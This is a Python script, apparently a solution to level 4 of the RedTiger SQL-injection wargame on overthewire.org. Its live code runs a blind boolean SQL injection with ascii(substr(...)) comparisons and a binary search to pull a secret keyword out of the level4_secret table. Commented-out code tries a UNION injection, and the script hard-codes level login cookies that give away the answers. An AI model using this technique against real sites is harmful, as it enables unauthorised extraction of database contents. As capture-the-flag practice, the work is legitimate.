# import requests

# url = "https://redtiger.labs.overthewire.org/level4.php"
# cookies = {
#     'level4login':"put_the_kitten_on_your_head"
# }
# username = 'admin'
# password = "admin"

# # for i in range(32,128):    
# #     params = {
# #         'id':"1 union select 1,keyword from level4_secret where substring(keyword, 1, 1)={0}#".format(i)
# #     }
# #     print('Trying : ',i, end=" ")
# #     res = requests.get(url, params=params , cookies=cookies )
# #     if "Query returned 1" in res.text:
# #         print(res.text)
# #         break
# #     if "Query returned 0" in res.text:
# #         print("Retunred zero")
        
# params = {
#         'id':"1 union select 1,keyword from level4_secret where substring(keyword, 1, 1)={0}#".format(i)
#     }

import re
import requests
def exe_get(url):
    cookies = {
        "level2login": "4_is_not_random",
        "level3login": "feed_your_cat_before_your_cat_feeds_you",
        "level4login": "there_is_no_bug",
        "level5login": "there_is_a_truck"
    }
    response = requests.get(url, cookies=cookies)
    html = response.text
    match = re.search('0', html)
    if match:
        return -1
    else:
        return 1
def get_data_char(i):
    url_template = "https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),{0},1))>{1}"
    low,high = 48,126
    while low<=high:
        mid = (low+high)//2
        url = url_template.format(i,mid)
        result = exe_get(url)
        if result>0:
            low = mid+1
        else:
            high=mid-1
        print(low,high,mid)
    print(low)
    return low

def get_data():
    data=""
    for i in range(1,18):
        char=get_data_char(i)
        data += chr(char)
        print(data)
        with open('data.txt','w') as out:
            out.write(data)
get_data()